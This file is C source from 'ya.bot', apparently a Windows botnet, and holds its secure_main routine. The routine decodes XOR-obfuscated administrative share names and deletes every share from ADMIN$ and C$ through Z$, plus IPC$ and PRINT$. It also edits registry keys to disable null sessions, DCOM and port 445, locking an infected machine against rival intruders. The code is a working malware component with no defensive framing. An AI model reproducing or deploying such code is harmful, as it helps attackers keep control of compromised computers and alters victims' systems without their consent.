/*  ya.bot  */

#include "bot.h"

#ifndef NO_SECURE
DWORD WINAPI secure_main(LPVOID param)
{
	char *rgpszShareList[] =
	{
			(char *)L"\x88\x8D\x84\x80\x87\xED", //ADMIN$
			(char *)L"\x8A\xED", //C$
			(char *)L"\x8D\xED", //D$
			(char *)L"\x8C\xED", //E$
			(char *)L"\x8F\xED", //F$
			(char *)L"\x8E\xED", //G$
			(char *)L"\x81\xED", //H$
			(char *)L"\x80\xED", //I$
			(char *)L"\x80\x99\x8A\xED", //IPC$
			(char *)L"\x83\xED", //J$
			(char *)L"\x82\xED", //K$
			(char *)L"\x85\xED", //L$
			(char *)L"\x84\xED", //M$
			(char *)L"\x87\xED", //N$
			(char *)L"\x86\xED", //O$
			(char *)L"\x99\xED", //P$
			(char *)L"\x99\x9B\x80\x87\x9D\xED", //PRINT$
			(char *)L"\x98\xED", //Q$
			(char *)L"\x9B\xED", //R$
			(char *)L"\x9A\xED", //S$
			(char *)L"\x9D\xED", //T$
			(char *)L"\x9C\xED", //U$
			(char *)L"\x9F\xED", //V$
			(char *)L"\x9E\xED", //W$
			(char *)L"\x91\xED", //X$
			(char *)L"\x90\xED", //Y$
			(char *)L"\x93\xED", //Z$
			NULL
	};
	int i;

#ifndef NO_DEBUG
		debug_print("Securing bot, secure_main()");
#endif

//Delete Shares
	for (i = 0; i < ARRAYSIZE(rgpszShareList); i++)
	{
		if (!rgpszShareList[i])
				break;
			crypto_xor(rgpszShareList[i], xorkey);
			NetShareDel(NULL, (unsigned short *)rgpszShareList[i], 0);
			crypto_xor(rgpszShareList[i], xorkey);
	}
//Disable NULL Session
		registry_writedword(HKEY_LOCAL_MACHINE,
				(char *)string_securenonullsessionsubkey,
				(char *)string_securenonullsessionvaluename,
				2);
//Disable DCOM
		registry_writestring(HKEY_LOCAL_MACHINE,
				(char *)string_securenodcomsubkey,
				(char *)string_securenodcomvaluename,
				"N");
//Disable Port 445
		registry_writestring(HKEY_LOCAL_MACHINE,
				(char *)string_securenonetbtsubkey,
				(char *)string_securenonetbtvaluename,
				"");
		thread_remove(THREAD_SECURE);
		return 0;
}
#endif